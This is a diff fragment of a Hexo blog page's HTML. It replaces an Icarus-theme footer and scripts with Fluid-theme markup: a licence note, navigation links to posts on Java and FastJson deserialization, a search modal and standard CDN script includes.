<code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "此网站使用Cookie来改善您的体验。",
-          dismiss: "知道了！",
-          allow: "允许使用Cookie",
-          deny: "拒绝",
-          link: "了解更多",
-          policy: "Cookie政策",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
-        });</script></body></html>
+<p><img src="https://www.hualigs.cn/image/6086b21e68121.jpg" srcset="/img/loading.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">java反序列化学习-CommonsCollections3.1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="hidden-mobile">FastJson反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
